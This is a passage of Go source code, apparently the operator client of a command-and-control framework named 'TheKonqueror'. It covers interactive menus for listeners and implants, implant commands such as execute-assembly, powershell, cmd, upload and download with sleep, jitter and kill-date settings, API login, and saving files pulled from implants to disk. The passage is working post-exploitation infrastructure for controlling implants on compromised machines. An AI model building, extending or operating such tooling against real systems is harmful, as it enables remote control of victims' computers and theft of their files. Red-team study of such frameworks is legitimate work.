					helpers.NicePrinting("info", "Task " + cmdSlice[2] + " is not completed or doesn't exists")
					break
				}
				if response.StatusCode == 500 {
					helpers.NicePrinting("fail", "There was an error with the request")
					break
				}
				var taskResult messages.Task
				err = json.NewDecoder(response.Body).Decode(&taskResult)
				if err != nil {
					helpers.NicePrinting("fail", err.Error())
					break
				}
				helpers.NicePrinting("info", "Results for task " + cmdSlice[2] + "\n")
				switch taskResult.Type {
				case "cat":
					if taskResult.Success == false {
						color.Red(taskResult.Result)
					} else {
						decoded, err := base64.StdEncoding.DecodeString(taskResult.Result)
						if err != nil {
							helpers.NicePrinting("fail", "Failed to decode the file")
							break
						}
						color.White(string(decoded))
					}
				case "download":
					if taskResult.Success == false {
						color.Red(taskResult.Result)
					} else {
						// Decode the file blob and save it to disk
						decoded, err := base64.StdEncoding.DecodeString(taskResult.Result)
						if err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						// Open a file and save to it
						file, err := os.Create(taskResult.Args[1])
						if err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}

						if _, err := file.Write(decoded); err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						if err := file.Sync(); err != nil {
							helpers.NicePrinting("fail", err.Error())
							break
						}
						_ = file.Close()
						helpers.NicePrinting("plus",
							"Successfully saved "+taskResult.Args[0]+" to "+taskResult.Args[1])
					}
				default:
					color.Cyan(taskResult.Result)
				}
				fmt.Println()
			default:
				helpers.NicePrinting("fail", "Please select a valid option")
			}
		}
	}


}

// Setting things up for the main menu
func (konqClient *konquerorClient) mainMenu() {
	prompt.Config.AutoComplete = konqClient.sortCompleter("main")
	prompt.SetPrompt("\033[31m(TheKonqueror)»\033[0m ")
	context = "main"
}

// Setting things up for the listeners menu
func (konqClient *konquerorClient) listenersMenu() {
	prompt.Config.AutoComplete = konqClient.sortCompleter("listeners")
	prompt.SetPrompt("\033[31m(TheKonqueror)»(Listeners)»\033[0m ")
	context = "listeners"
}

// Setting things up for the implant menu
func (konqClient *konquerorClient) implantMenu(implantName string) {
	prompt.Config.AutoComplete = konqClient.sortCompleter("implant")
	prompt.SetPrompt("\033[31m(TheKonqueror)»(Implants)»(" + implantName + ")»\033[0m ")
	// Set current working implant so we can call implants methods from map
	konqClient.currentWorkingImplant = uuid.Must(uuid.FromString(implantName))
	context = "implants"
}

// This method handles the auto completion of the client shell
func (konqClient *konquerorClient) sortCompleter(context string) *readline.PrefixCompleter {
	switch context {
	case "main":
		return readline.NewPrefixCompleter(
			readline.PcItem("?"),
			readline.PcItem("help"),
			readline.PcItem("listeners"),
			readline.PcItem("modules"),
			readline.PcItem("interact",
				readline.PcItemDynamic(konqClient.getActiveImplants())),
			readline.PcItem("list",
				readline.PcItem("implants"),
				readline.PcItem("listeners")),
			readline.PcItem("kill",
				readline.PcItem("implant",
					readline.PcItemDynamic(konqClient.getActiveImplants())),
				readline.PcItem("listener")),
			readline.PcItem("modules"),
			readline.PcItem("quit"),
			readline.PcItem("set",
				readline.PcItem("listener")),
		)
	case "listeners":
		return readline.NewPrefixCompleter(
			readline.PcItem("?"),
			readline.PcItem("help"),
			readline.PcItem("main"),
			readline.PcItem("back"),
			readline.PcItem("generate",
				readline.PcItem("http2")),
			readline.PcItem("quit"),
		)
	case "implant":
		return readline.NewPrefixCompleter(
			readline.PcItem("?"),
			readline.PcItem("help"),
			readline.PcItem("execute-assembly"),
			readline.PcItem("main"),
			readline.PcItem("back"),
			readline.PcItem("quit"),
			readline.PcItem("cmd"),
			readline.PcItem("powershell"),
			readline.PcItem("info"),
			readline.PcItem("sysinfo"),
			readline.PcItem("download"),
			readline.PcItem("upload"),
			readline.PcItem("cat"),
			readline.PcItem("ls"),
			readline.PcItem("ifconfig"),
			readline.PcItem("set",
				readline.PcItem("Sleep"),
				readline.PcItem("KillDate"),
				readline.PcItem("Jitter")),
		)
	}
	return nil
}

// Method to autocomplete implant name
func (konqClient *konquerorClient) getActiveImplants() func(string) []string {
	return func(line string) []string {
		list := make([]string, 0)
		for _, implant := range konqClient.globalActiveImplants {
			list = append(list, implant.UUID.String())
		}
		return list
	}
}

// Method to check if an implant is in the locally saved active implants
func (konqClient *konquerorClient) getActiveImplant(implantUUID uuid.UUID) bool {
	for _, implant := range konqClient.globalActiveImplants {
		if implant.UUID == implantUUID {
			return true
		}
	}
	return false
}

// Method to get the current working implant listener uuid
func (konqClient *konquerorClient) getListenerUUID(implantUUID uuid.UUID) (uuid.UUID, bool) {
	for _, implant := range konqClient.globalActiveImplants {
		if implant.UUID == implantUUID {
			return implant.ListenerUUID, true
		}
	}
	return uuid.UUID{}, false
}

// Method to print implant info or system info
func (konqClient *konquerorClient) printImplant(implant messages.Implant, mode string) {
	if mode == "info" {
		implant.PrintImplantInfo()
	} else if mode == "sysinfo" {
		implant.PrintSysInfo()
	}
}

// Method to get an implant from slice
func (konqClient *konquerorClient) getImplant(implantUUID uuid.UUID) *messages.Implant {
	for _, implant := range konqClient.globalActiveImplants {
		if implant.UUID == implantUUID {
			return implant
		}
	}
	return nil
}

// Method to perform a POST request
func (konqClient *konquerorClient) doPost(path string, message interface{}) (*http.Response, error) {

	buffer := new(bytes.Buffer)
	err := json.NewEncoder(buffer).Encode(message)
	if err != nil {
		return nil, err
	}

	// Create a new request object
	request, _ := http.NewRequest("POST", konqClient.apiAddress+path, buffer)
	// Set the headers
	request.Header.Set("Cookie", "APIKEY="+konqClient.apiKey)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", "The Conqueror client v0.1.0")
	// Send the request
	response, err := konqClient.httpClient.Do(request)

	if err != nil {
		helpers.NicePrinting("fail", "Failed to send the request")
		color.Cyan(err.Error())
		return nil, err
	}

	return response, nil
}

// Method to perform a GET request
func (konqClient *konquerorClient) doGet(path string) (*http.Response, error) {
	request, err := http.NewRequest("GET", konqClient.apiAddress + path, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Set("Cookie", "APIKEY=" + konqClient.apiKey)
	response, err := konqClient.httpClient.Do(request)
	if err != nil {
		return nil, err
	}
	return response, nil
}

// This method logs out the client from the API server
func (konqClient *konquerorClient) logout() {
	response, err := konqClient.doGet("/api/logout")
	if err != nil {
		panic(err)
	}
	if response.StatusCode != 200 {
		panic("Failed to log out, needs to be done manually on the DB")
	}
	helpers.NicePrinting("info", "Logged out of the API Server")
}

// This method logs the client with the API Server
func (konqClient *konquerorClient) login() {

	// Hash the password
	sha256 := sha2562.New()
	sha256.Write([]byte(konqClient.password))
	hashedPassword := hex.EncodeToString(sha256.Sum(nil))

	loginMessage := messages.Login{
		Username: konqClient.username,
		Password: hashedPassword,
	}

	// Send the request
	response, err := konqClient.doPost("/api/login", loginMessage)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// Store the response in a message object
	loginResult := messages.Message{}
	decoder := json.NewDecoder(response.Body)
	err = decoder.Decode(&loginResult)
	if err != nil {
		helpers.ExitOnError(err.Error())
	}

	// If the response code is not 200 then print the message and exit
	if response.StatusCode != 200 {
		if loginResult.Message.(string) == "sql: no rows in result set" {
			helpers.ExitOnError("The operator is either not existent or already logged in")
		}
		helpers.ExitOnError(loginResult.Message.(string))
	}

	helpers.NicePrinting("plus", "Successfully authenticated to the API server")
	helpers.NicePrinting("info", "The API Key is stored in this session and can be recovered by typing apikey")

	// Save the API Key
	konqClient.apiKey = loginResult.Message.(string)

}